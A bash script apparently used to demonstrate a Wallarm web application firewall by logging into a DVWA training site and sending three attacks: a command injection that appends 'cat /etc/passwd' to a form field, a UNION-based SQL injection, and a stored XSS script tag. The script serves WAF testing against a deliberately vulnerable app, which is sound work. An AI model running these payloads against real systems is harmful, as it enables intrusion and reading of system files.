#!/bin/bash

log_message () {
	SEVERITY=$1
	MESSAGE="$2"
	echo `date`: "$SEVERITY" "$MESSAGE"
}


usage() {
        echo "Usage: 

        Supported parameters (all the parameters are optional):
                -h
                        This help message.
                -S <SITE_NAME>
                        The name of used Wallarm site: EU or US1 (by default the script uses EU site).
                -u <DEPLOY_USER>
                        The username to be used for the new node registration process.
                -p <DEPLOY_PASSWORD>
                        The password to be used for the new node registration process.
                -n <NODE_MAME>
                        The name of the node as it will visible in the Wallarm console UI (by 
                        default the script will use the host name).
                -d <DOMAIN_NAME>
                        The WAF reverse proxy will be configured to handle traffic for the domain.
                -o <ORIGIN_SERVER>
                        The WAF reverse proxy will be configured to send upstream requests to the
                        specified IP address or domain name."
}

export DVWA_USERNAME=admin

export DVWA_PASSWORD=password

export DOMAIN_NAME=dvwa.wallarm-demo.com

export SERVER_NAME=$DOMAIN_NAME

export AUTH_COOKIE


while getopts :hu:p:d:s: option
do
        case "$option" in
                h)
                        usage;
                        exit 1
                        ;;
                u)
                        DVWA_USERNAME=$OPTARG;
                        ;;
                p)
                       
                        DVWA_PASSWORD=$OPTARG;
                        ;;
                d)
                        
                        DOMAIN_NAME=$OPTARG;
                        ;;
                s)
                        
                        SERVER_NAME=$OPTARG;
                        ;;
                *)
                        echo "Hmm, an invalid option was received."
                        usage
                        exit 1
                        ;;
        esac
done

login () {

	log_message INFO "Retrieving the session ID..."
	curl -x$SERVER_NAME:80 "http://$DOMAIN_NAME/login.php" -v > /tmp/tmp.txt 2>&1

	PHPSESSION=`cat /tmp/tmp.txt |grep PHPSESS|tail -1|cut -f3 -d" "|grep 'PHPSESSID='`

	if [ -z "$PHPSESSION" ]; then
		log_message CRTICAL "Failed to retrieve a session ID - aborting..."
		exit 1
	fi
	log_message INFO "Retrieved session ID \"$PHPSESSION\""

	USER_TOKEN=`cat /tmp/tmp.txt |grep user_token|awk '{print $4}'|cut -f2 -d=|cut -f2 -d\'`

	if [ -z "$USER_TOKEN" ]; then
		log_message CRITICAL "Failed to retrieve a user token - aborting..."
		exit 1
	fi

	log_message INFO "Logging in to the DVWA application..."
	curl -H "Cookie: $PHPSESSION security=low" -x$SERVER_NAME:80 "http://$DOMAIN_NAME/login.php" -X POST -d "username=$DVWA_USERNAME&password=$DVWA_PASSWORD&Login=Login&user_token=$USER_TOKEN" -v -H "Content-Type: application/x-www-form-urlencoded"

}

rce () {
	log_message INFO "Trying RCE exploit..."

	curl -H "Cookie: $PHPSESSION security=low" -x$SERVER_NAME:80 "http://$DOMAIN_NAME/vulnerabilities/exec/" -X POST -d"ip=8.8.8.8%3B+cat+%2Fetc%2Fpasswd&Submit=Submit" -H "Content-Type: application/x-www-form-urlencoded" 2>&1

}

sqli () {
	log_message INFO "Trying SQLi exploit..."
	curl -H "Cookie: $PHPSESSION security=low" -x$SERVER_NAME:80 "http://$DOMAIN_NAME/vulnerabilities/sqli/?id=%25%27+or+0%3D0+union+select+null%2C+version%28%29+%23&Submit=Submit" 2>&1
}

stored_xss () {
	log_message INFO "Trying Stored XSS  exploit..."
	curl -H "Cookie: $PHPSESSION security=low" -x$SERVER_NAME:80 "http://$DOMAIN_NAME/vulnerabilities/xss_s/" -X POST -d"txtName=werewrwer&mtxMessage=%3Cscript%3Ealert%28%22This+is+a+XSS+est%22%29%3C%2Fscript%3E&btnSign=Sign+Guestbook" -H "Content-Type: application/x-www-form-urlencoded" 2>&1
}

login

rce

sqli

stored_xss


